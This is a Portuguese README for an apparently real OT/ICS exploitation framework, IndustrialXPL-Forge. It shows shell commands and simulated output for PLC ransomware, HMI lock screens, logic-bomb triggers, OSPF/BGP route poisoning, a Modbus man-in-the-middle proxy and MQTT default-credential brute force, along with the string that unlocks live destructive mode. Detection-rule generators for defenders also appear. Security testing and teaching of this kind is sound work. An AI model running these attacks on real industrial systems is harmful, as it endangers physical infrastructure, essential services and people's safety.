![IndustrialXPL-Forge](docs/img/industrialxpl_forge-banner_16x9-en_us.png)

# IndustrialXPL-Forge (IXF)

> **O Maior Framework de Assessment e Exploração de Segurança OT/ICS/SCADA do Mundo**
> Parte da suite XPL-Forge | Autor: André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://uniaogeek.com.br/)

[![PyPI](https://img.shields.io/pypi/v/industrialxpl-forge?color=red&label=PyPI)](https://pypi.org/project/industrialxpl-forge/)
[![Python](https://img.shields.io/pypi/pyversions/industrialxpl-forge?color=blue&label=Python)](https://pypi.org/project/industrialxpl-forge/)
[![Licença: MIT](https://img.shields.io/badge/Licen%C3%A7a-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://img.shields.io/github/actions/workflow/status/mrhenrike/IndustrialXPL-Forge/ci.yml?branch=master&label=CI)](https://github.com/mrhenrike/IndustrialXPL-Forge/actions)
[![Módulos](https://img.shields.io/badge/M%C3%B3dulos-1000%2B-brightgreen)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![Vendors](https://img.shields.io/badge/Vendors-150%2B-orange)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![Protocolos](https://img.shields.io/badge/Protocolos-50%2B-blue)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![MITRE ATT&CK ICS](https://img.shields.io/badge/MITRE%20ATT%26CK%20ICS-v19-red)](https://attack.mitre.org/matrices/ics/)
[![Plataforma](https://img.shields.io/badge/Plataforma-OT%20%7C%20ICS%20%7C%20SCADA%20%7C%20IIoT-darkred)](https://github.com/mrhenrike/IndustrialXPL-Forge)

**Python-First. Implementação pura em Python - instale e execute com um único `pip install`.**

---

## Início Rápido

```bash
pip install industrialxpl
ixf
```

Ou a partir do código-fonte:

```bash
git clone https://github.com/mrhenrike/IndustrialXPL-Forge
cd IndustrialXPL-Forge
pip install -r requirements.txt
python ixf.py
```

---

## O que é o IXF?

O IndustrialXPL-Forge é um framework modular, nativo em Python, para **assessment de segurança e exploração** em ambientes de **Tecnologia Operacional (OT)**, **Sistemas de Controle Industrial (ICS)**, **SCADA**, **IHM (HMI)**, **CLP (PLC)**, **RTU**, **DCS** e **IIoT**.

Cobre o **ciclo completo de ataque**:

```
OSINT → Descoberta → Fingerprint → Verificação de Vulnerabilidade → Exploit → Relatório
```

**Funcionalidades principais:**
- **Python-First**: toda a funcionalidade central funciona com `pip install industrialxpl` - runtimes externos (C, Go, Java) são aceleradores opcionais com fallback Python embutido
- **SafeMode por padrão**: todo módulo executa em modo simulação - imprime o payload sem enviar
- **MITRE ATT&CK for ICS v19**: 79 técnicas mapeadas, sintaxe `ttp T0843 192.168.1.100`
- **Cobertura de CVEs**: 3.300+ CVEs ICS/OT de CVSS 0,1 a 10,0
- **50 vendors**: Siemens, Schneider, Rockwell, ABB, Honeywell, WEG, NOVA Smar, e mais
- **50 protocolos**: Modbus, S7comm, EtherNet/IP, DNP3, BACnet, IEC-104, OPC UA, PROFINET, e mais

---

## Exemplos de Uso

```
# Abrir o shell interativo do IXF
ixf

# Carregar e executar um módulo (modo simulação por padrão - seguro)
ixf > use scanners/ics/modbus_detect
ixf > set target 192.168.1.100
ixf > check

# Executar um TTP-ID contra um alvo
ixf > ttp T0843 192.168.1.100          # Program Download - todos os módulos
ixf > ttp T0878 10.0.0.0/24            # Alarm Suppression - varredura de sub-rede
ixf > ttp-list --tactic evasion        # Listar TTP-IDs de Evasão

# Varredura MITRE ATT&CK for ICS
ixf > mitre-scan discovery 192.168.1.0/24
ixf > mitre-scan evasion 192.168.1.100
ixf > mitre-all 192.168.1.100          # Todas as 79 técnicas (simular por padrão)
ixf > mitre-coverage                   # % de cobertura por tática

# Módulos específicos de CVE
ixf > cve CVE-2026-25895               # FUXA SCADA RCE pré-auth
ixf > cve CVE-2015-5374               # Siemens SIPROTEC4 DoS
ixf > cve-scan 192.168.1.0/24         # Descobrir ativos + testar todos os CVEs

# Gerar relatórios
ixf > report json
ixf > mitre-report layer               # Layer JSON para ATT&CK Navigator
```

---

## SafeMode / DestructiveMode

**Todo módulo é executado em modo simulação por padrão** - imprime o que FARIA sem enviar nenhum pacote.

```
ixf (FrostyGoop) > run                 # SIMULAÇÃO: imprime payload, não envia
ixf (FrostyGoop) > set simulate false
ixf (FrostyGoop) > set destructive true
ixf (FrostyGoop) > run                 # AO VIVO: exibe banner + exige confirmação
```

Níveis de impacto exigem confirmação proporcional:
- `INFO/READ`: automático
- `CRITICAL`: digitar a string completa de confirmação
- `CATASTROPHIC`: digitar string + aguardar 10 segundos

Todas as operações destrutivas são registradas em `.log/destructive_ops_AAAA-MM-DD.log`.

---

## Documentação

Documentação completa disponível em inglês e português brasileiro:

| Idioma | Link |
|--------|------|
| English (en-US) | [docs/en-us/](docs/en-us/_index.md) |
| Português (pt-BR) | [docs/pt-br/](docs/pt-br/_index.md) |

**Links rápidos:**

| Tópico | en-US | pt-BR |
|--------|-------|-------|
| Instalação | [01-installation](docs/en-us/01-installation.md) | [01-instalacao](docs/pt-br/01-instalacao.md) |
| Início Rápido | [02-quick-start](docs/en-us/02-quick-start.md) | [02-inicio-rapido](docs/pt-br/02-inicio-rapido.md) |
| Referência do Shell (35 comandos) | [03-shell-reference](docs/en-us/03-shell-reference.md) | [03-referencia-shell](docs/pt-br/03-referencia-shell.md) |
| Sistema de Módulos | [04-module-system](docs/en-us/04-module-system.md) | [04-sistema-modulos](docs/pt-br/04-sistema-modulos.md) |
| SafeMode / DestructiveMode | [05-safemode](docs/en-us/05-safemode-destructivemode.md) | [05-safemode](docs/pt-br/05-safemode-destructivemode.md) |
| MITRE ATT&CK for ICS | [06-mitre](docs/en-us/06-mitre-attack-ics.md) | [06-mitre](docs/pt-br/06-mitre-attack-ics.md) |
| SAST / LLM | [07-sast](docs/en-us/07-sast-llm.md) | [07-sast](docs/pt-br/07-sast-llm.md) |
| Protocolos e Vendors | [08-protocols](docs/en-us/08-protocols-vendors.md) | [08-protocolos](docs/pt-br/08-protocolos-vendors.md) |
| Desenvolvimento de Módulos | [09-dev](docs/en-us/09-module-development.md) | [09-desenvolvimento](docs/pt-br/09-desenvolvimento-modulos.md) |
| PolyExploit Runner | [11-poly](docs/en-us/11-poly-exploit-runner.md) | [11-poly](docs/pt-br/11-poly-exploit-runner.md) |
| Assessment e Conformidade | [12-assessment](docs/en-us/12-assessment-compliance.md) | [12-assessment](docs/pt-br/12-assessment-conformidade.md) |

---

## Categorias de Ataque (v2.0.0)

> **AVISO LEGAL:** Todos os módulos desta seção são destinados **exclusivamente a testes de segurança autorizados, pesquisa e uso educacional**. A execução contra sistemas sem autorização expressa e por escrito configura crime federal de acordo com as leis de fraude cibernética. Os autores e a União Geek não assumem responsabilidade por uso indevido.

### Ransomware (OT/ICS) - Apenas Simulação Educacional

> **AVISO:** Módulos de ransomware são ESTRITAMENTE em modo simulação por padrão.
> Confirmação tripla obrigatória para execução ao vivo. Uso não autorizado é crime federal.

```bash
ixf > use exploits/ransomware/plc_project_locker
ixf (PLCProjectLocker) > set target 192.168.1.10
ixf (PLCProjectLocker) > set port 502
ixf (PLCProjectLocker) > set simulate true   # Flag de segurança obrigatória
ixf (PLCProjectLocker) > run

[SIMULATE] Conexão Modbus TCP para 192.168.1.10:502
[SIMULATE] Zeraria registradores holding: FC16 @ addr 0 len 125
[SIMULATE] 2 requisições FC16 necessárias (123 + 2 registradores)
[SIMULATE] Impacto: PLC pararia execução do programa - TTP CISA AA26-097A
[!] Para executar ao vivo: set simulate false, set destructive true
[!] Em seguida, digite a string de confirmação: I_UNDERSTAND_THIS_IS_DESTRUCTIVE
```

```bash
ixf > use exploits/ransomware/hmi_display_ransomware
ixf (HMIDisplayRansomware) > set target 192.168.1.20
ixf (HMIDisplayRansomware) > set display_register 1000
ixf (HMIDisplayRansomware) > set simulate true
ixf (HMIDisplayRansomware) > run

[SIMULATE] Escreveria 20 registradores (40 chars) no registrador Modbus 1000
[SIMULATE] Tela do HMI exibiria: "YOUR SYSTEM IS LOCKED..."
[SIMULATE] Baseado no TTP de manipulação de HMI do TRITON/TRISIS
[!] Gate triplo obrigatório para execução ao vivo
```

| Módulo | Caminho | Impacto | Requer |
|--------|---------|---------|--------|
| `plc_project_locker` | `exploits/ransomware/` | CATASTRÓFICO | Gate triplo |
| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTRÓFICO | Gate triplo |

### Persistência

> **AVISO:** Módulos de logic bomb simulam a ativação de rotinas pré-plantadas no PLC. A execução não autorizada interrompe processos físicos.

```bash
ixf > use exploits/persistence/plc_logic_bomb_inject
ixf (PLCLogicBombActivate) > set target 192.168.1.10
ixf (PLCLogicBombActivate) > set trigger_register 9999
ixf (PLCLogicBombActivate) > set trigger_value 0xDEAD
ixf (PLCLogicBombActivate) > set simulate true
ixf (PLCLogicBombActivate) > run

[SIMULATE] Escreveria valor 0xDEAD (57005) no registrador holding 9999
[SIMULATE] Em 192.168.1.10:502 unit_id=1 usando FC16
[SIMULATE] Se uma rotina de logic bomb monitorar o registrador 9999, ela será ativada
[SIMULATE] Baseado nos TTPs do malware ICS INCONTROLLER/PIPEDREAM (Dragos 2022)
[!] Set destructive true para executar após confirmação
```

| Módulo | Caminho | Impacto | Referência |
|--------|---------|---------|-----------|
| `plc_logic_bomb_inject` | `exploits/persistence/` | ALTO | CISA AA22-103A, Dragos CHERNOVITE |

### Envenenamento de Tabela de Roteamento

> **AVISO:** Ataques de injeção de rota redirecionam tráfego de rede e podem interromper serviços OT/IT em produção. Apenas para laboratório autorizado.

```bash
ixf > use exploits/routing/ospf_lsa_inject
ixf (OSPFLSAInject) > set iface eth0
ixf (OSPFLSAInject) > set area_id 0.0.0.0
ixf (OSPFLSAInject) > set poison_prefix 10.0.0.0
ixf (OSPFLSAInject) > set simulate true
ixf (OSPFLSAInject) > run

[SIMULATE] LSA OSPF Tipo Router (Tipo 1) seria construído:
[SIMULATE]   Area: 0.0.0.0 / Router-ID: 192.168.1.100
[SIMULATE]   Rede: 10.0.0.0/255.255.255.0 via metrica=1
[SIMULATE] Pacote LSU (72 bytes): 02010024...
[SIMULATE] Seria enviado para 224.0.0.5 (AllSPFRouters) x3 na eth0
[!] PRÉ-REQUISITO: Scapy + segmento de rede rodando OSPF (sem autenticação)
```

```bash
ixf > use exploits/routing/bgp_vortex_dos
ixf (BGPVortexDoS) > set target 10.0.0.1
ixf (BGPVortexDoS) > set attacker_as 65001
ixf (BGPVortexDoS) > set victim_as 65000
ixf (BGPVortexDoS) > set simulate true
ixf (BGPVortexDoS) > run

[SIMULATE] Estabeleceria sessão BGP para 10.0.0.1:179
[SIMULATE] UPDATE-A: AS_PATH=[65001,65000] MED=100 COMMUNITY=65001:100
[SIMULATE] UPDATE-B: WITHDRAW + re-announce AS_PATH=[65001] MED=200
[SIMULATE] UPDATE-C: AS_PATH=[65001,65000,65001] MED=50 COMMUNITY=65001:50
[SIMULATE] Essas mensagens causam oscilação persistente no Processo de Decisão BGP (Efeito Vortex)
[SIMULATE] Referência: Stoeger et al., USENIX Security 2025 - BGP Vortex
```

| Módulo | Caminho | Impacto | Referência |
|--------|---------|---------|-----------|
| `ospf_lsa_inject` | `exploits/routing/` | ALTO | DCmal-2025 OSPF spoofing (MDPI 2025), RFC 2328 |
| `bgp_vortex_dos` | `exploits/routing/` | ALTO | Stoeger et al., USENIX Security 2025 |

### MiTM - Proxy Modbus TCP Inline

> **AVISO:** O proxy inline com injeção de valores falsifica leituras de sensores entregues aos operadores. Pode causar julgamento incorreto do processo com consequências físicas. Apenas laboratório autorizado.

```bash
ixf > use assessment/lateral/modbus_mitm_inline
ixf (ModbusMiTM) > set target 192.168.1.10       # PLC
ixf (ModbusMiTM) > set listen_host 0.0.0.0
ixf (ModbusMiTM) > set listen_port 1502           # Porta do proxy do atacante
ixf (ModbusMiTM) > set simulate true
ixf (ModbusMiTM) > run

[SIMULATE] Ligaria proxy TCP em 0.0.0.0:1502
[SIMULATE] Encaminharia todas as conexões para o PLC real em 192.168.1.10:502
[SIMULATE] Todos os frames Modbus registrados com info de código de função decodificada

# Captura passiva ao vivo (sem injeção de valores):
ixf (ModbusMiTM) > set simulate false
ixf (ModbusMiTM) > run

[*] Proxy Modbus MiTM iniciado em 0.0.0.0:1502
[*] Encaminhando para 192.168.1.10:502
[+] Cliente conectado: 192.168.1.50
[>] FC3 ReadHoldingRegs addr=0 count=10 -> PLC
[<] Resposta: 10 registradores [0x0001, 0x00F2, ...]
[>] FC16 WriteRegs addr=0 data=[...] -> PLC  [REGISTRADO]
```

| Módulo | Caminho | Impacto | Pré-requisitos |
|--------|---------|---------|----------------|
| `modbus_mitm_inline` | `assessment/lateral/` | ALTO | ARP poisoning ativo (usar modbus_arp_mitm primeiro) |

### Ataques de Credenciais

```bash
ixf > use creds/generic/ics_mqtt_bruteforce
ixf (MQTTBruteforce) > set target 192.168.1.50
ixf (MQTTBruteforce) > set port 1883
ixf (MQTTBruteforce) > set simulate true
ixf (MQTTBruteforce) > run

[SIMULATE] Tentaria 18 pares de credenciais contra o broker MQTT em 192.168.1.50:1883
[SIMULATE] Primeiros 5: admin:admin, admin:password, admin:, :, guest:guest
[SIMULATE] Fonte: padrões ICS integrados (Mosquitto, HiveMQ, EMQX, específicos SCADA)
```

| Módulo | Caminho | Impacto | Referência |
|--------|---------|---------|-----------|
| `ics_mqtt_bruteforce` | `creds/generic/` | MÉDIO | OASIS MQTT v3.1.1, MITRE T0806 |

### Resumo de Cobertura

| Categoria | Módulos | Modo Padrão |
|-----------|---------|------------|
| Ransomware / Impacto | `plc_project_locker`, `hmi_display_ransomware` | simulate=True (gate triplo para ao vivo) |
| Persistência | `plc_logic_bomb_inject` | simulate=True |
| Roteamento (RTP) | `ospf_lsa_inject`, `bgp_vortex_dos` | simulate=True |
| MiTM | `modbus_arp_mitm`, `modbus_mitm_inline` | simulate=True |
| Credenciais | `ics_mqtt_bruteforce`, + 30+ módulos vendor | simulate=True |
| CVE 2025 | `siemens_telecontrol_cve_2025` | simulate=True |

Todos os módulos destrutivos utilizam `simulate=True` por padrão. Módulos de ransomware/wiper exigem confirmação de gate triplo: `simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`.

---

## Módulos Purple Team e Detecção

### Modbus PCAP Analyzer

Analisa capturas de tráfego Modbus/TCP em busca de operações de escrita não autorizadas e padrões de reconhecimento.

```bash
ixf > use assessment/detection/modbus_pcap_analyzer
ixf (ModbusPCAP) > set PCAP_FILE /tmp/captura_modbus.pcap
ixf (ModbusPCAP) > set OUTPUT_JSON /tmp/analise.json
ixf (ModbusPCAP) > run

[*] Analisando PCAP Modbus: /tmp/captura_modbus.pcap
[+] 847 transações Modbus processadas

Resumo:
  Total de transações:      847
  IPs de origem únicos:     3
  Operações de escrita:     12
  Operações PERIGOSAS:      4  <- FC5/6/15/16
  Operações de Recon:       2  <- FC43/FC17

[!] ALERTA: 4 operações de escrita Modbus PERIGOSAS detectadas

Origem       Destino      FC   Nome                   Reg   Flag
10.0.1.100   10.0.1.10   16   Write Multiple Regs    100   [PERIGOSO]
10.0.1.100   10.0.1.10   5    Write Single Coil      1     [PERIGOSO]
10.0.1.200   10.0.1.10   43   Read Device ID         -     [RECON]

[+] Relatório JSON salvo: /tmp/analise.json
[*] Dica: capture com: tcpdump -w captura.pcap 'tcp port 502'
```

### Gerador de Regras Suricata OT

Gera regras Suricata IDS adaptadas para detecção de anomalias em protocolos OT/ICS.

```bash
ixf > use assessment/detection/suricata_ot_rules_generator
ixf (SuricataOT) > set OUTPUT_FILE /tmp/regras_ics.rules
ixf (SuricataOT) > set PROTOCOLS modbus,dnp3,bacnet
ixf (SuricataOT) > set INCLUDE_CVE_RULES true
ixf (SuricataOT) > run

[*] Gerando regras Suricata OT/ICS
[+] Regras Modbus:    18 (operações de escrita, abuso de código de função, broadcast)
[+] Regras DNP3:       9 (resposta não solicitada, controle não autorizado)
[+] Regras BACnet:    11 (flood who-is, abuso de foreign device)
[+] Regras por CVE:   14 (assinaturas TRITON, FrostyGoop, INCONTROLLER)
[+] Total de regras:  52

[+] Regras gravadas em: /tmp/regras_ics.rules
[*] Carregue com: suricata -r trafego.pcap -S /tmp/regras_ics.rules
```

### Gerador de Regras Zeek para Modbus

Gera scripts Zeek/Bro para análise e alertas de tráfego Modbus/TCP.

```bash
ixf > use assessment/detection/modbus_zeek_rule_generator
ixf (ModbusZeek) > set OUTPUT_DIR /tmp/scripts_zeek
ixf (ModbusZeek) > set ALERT_WRITE_OPS true
ixf (ModbusZeek) > set ALERT_BROADCAST true
ixf (ModbusZeek) > run

[*] Gerando scripts Zeek para análise Modbus
[+] modbus-write-monitor.zeek     Alertas em operações de escrita FC5/6/15/16
[+] modbus-broadcast-detect.zeek  Detecta recon com broadcast unit_id=255
[+] modbus-function-log.zeek      Log completo de códigos de função
[+] modbus-anomaly-detect.zeek    Alertas de desvio de baseline estatístico

[+] Scripts salvos em: /tmp/scripts_zeek/
[*] Carregue com: zeek -i eth0 /tmp/scripts_zeek/
```

### CoAP Protocol Fuzzer

Envia pacotes CoAP malformados para testar a resiliência de dispositivos IIoT embarcados contra ataques de parser.

```bash
ixf > use exploits/protocols/coap_fuzzer
ixf (CoAPFuzzer) > set TARGET 192.168.1.10
ixf (CoAPFuzzer) > set PORT 5683
ixf (CoAPFuzzer) > set SIMULATE true
ixf (CoAPFuzzer) > run

[SIMULATE] CoAP Fuzzer: 8 casos de teste contra 192.168.1.10:5683

Caso                   Descrição                          Esperado
invalid_version_3      Campo version=3 (inválido)         ignorar/erro
tkl_overflow           TKL=15, apenas 4 bytes seguem      buffer overflow
payload_marker_empty   Marcador 0xFF com payload vazio    erro de protocolo
option_length_overflow Tamanho estendido 255, sem dados   leitura além do buffer
uri_path_traversal     /../../../etc/passwd no URI-Path   negação de acesso
observe_flood_50x      Flood de subscribe via CoAP Observe esgotamento de recursos
empty_rst              RST com código vazio               sem crash
giant_token_32         TKL=8 mas 32 bytes seguem          crash ou ignorar

[!] Defina SIMULATE=false para enviar ao alvo real
[!] TIMEOUT = possível DoS/crash | RESPOSTA = dispositivo ainda ativo
```

### Detecção de Honeypot Conpot

Identifica deployments do honeypot ICS Conpot detectando padrões de resposta característicos.

```bash
ixf > use assessment/detection/conpot_integration
ixf (ConpotDetect) > set TARGET 192.168.1.10
ixf (ConpotDetect) > set CHECK_MODBUS true
ixf (ConpotDetect) > set CHECK_S7 true
ixf (ConpotDetect) > run

[*] Verificando 192.168.1.10 por indicadores de honeypot Conpot
[*] Modbus FC43 (Read Device ID): vendor=Siemens, model=S7-200 [GENÉRICO - SUSPEITO]
[*] S7comm: versão de firmware corresponde ao padrão Conpot [INDICADOR]
[*] HTTP /index.html: template padrão Conpot detectado [CONFIRMADO]

[!] VEREDICTO: Alta confiança de honeypot Conpot (3/3 indicadores)
[*] Dica: um Siemens S7-200 real não expõe HTTP na porta 80 por padrão
```

### Nmap OT Scanner

Executa Nmap com scripts NSE específicos para OT/ICS para descoberta de protocolo e fingerprinting de serviço.

```bash
ixf > use scanners/ot/nmap_ot_scanner
ixf (NmapOT) > set TARGET 192.168.1.0/24
ixf (NmapOT) > set PROTOCOLS modbus,s7,bacnet,enip
ixf (NmapOT) > set SIMULATE true
ixf (NmapOT) > run

[SIMULATE] Nmap OT Scanner - alvo: 192.168.1.0/24

Comando que seria executado:
  nmap -sV -p 502,102,47808,44818 --script modbus-discover,s7-info,bacnet-info,enip-info 192.168.1.0/24

Scripts de descoberta esperados:
  modbus-discover   Porta 502   - Enumeração de Unit ID, info FC43
  s7-info           Porta 102   - Fingerprint de PLC Siemens S7comm
  bacnet-info       Porta 47808 - Lista de objetos de dispositivo BACnet
  enip-info         Porta 44818 - Objeto de identidade EtherNet/IP

[!] Defina SIMULATE=false para executar contra alvos reais (requer nmap instalado)
```

### Configuração de Laboratório (Docker)

Gera um laboratório ICS/OT completo com Docker Compose incluindo Conpot, FUXA SCADA e OpenPLC.

```bash
ixf > use assessment/lab_environment_setup
ixf (ICSLab) > set INCLUDE_CONPOT true
ixf (ICSLab) > set INCLUDE_FUXA true
ixf (ICSLab) > set OUTPUT_DIR /tmp/lab_ics
ixf (ICSLab) > run

[+] Arquivos do laboratório ICS/OT gerados em: /tmp/lab_ics
    docker-compose.yml     Definição dos serviços Docker
    setup.sh               Script de configuração automatizado
    LAB_NOTES.md           Guia de exercícios do laboratório

[*] Iniciar laboratório: cd /tmp/lab_ics && bash setup.sh
[*] Componentes:
    Conpot 172.20.0.10   Modbus:502, HTTP:80, S7comm:102
    FUXA  172.20.0.20   SCADA HMI: http://localhost:1881
[*] Parar laboratório: docker compose down
```

---

## Aviso Legal

Esta ferramenta é destinada **exclusivamente a testes de segurança autorizados, pesquisa e fins educacionais**.

O uso do IndustrialXPL-Forge contra sistemas que você não possui ou para os quais não tem **autorização expressa e por escrito** é **ilegal** e pode violar leis de fraude cibernética.

Sistemas OT/ICS controlam infraestruturas físicas críticas. O uso não autorizado pode causar:
- Danos físicos a equipamentos industriais
- Interrupção de serviços essenciais (energia, água, gás, manufatura)
- Lesões pessoais ou mortes
- Penalidades legais significativas

**Os autores e a União Geek não assumem responsabilidade por uso indevido. Os usuários assumem total responsabilidade legal e ética por todas as ações realizadas com esta ferramenta.**

---

## Autor e Créditos

**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://uniaogeek.com.br/)

Fontes dos módulos: EmbedXPL-Forge (irmão da suite), ISF/ICSSploit, ModBusSploit, n-days-poc-benchmark, InduGuard, pesquisa ZeronTek OT Hunt, CISA ICS-CERT advisories, Vedere Labs OT:ICEFALL, catálogo ExploitDB ICS, PoCs públicos no GitHub.
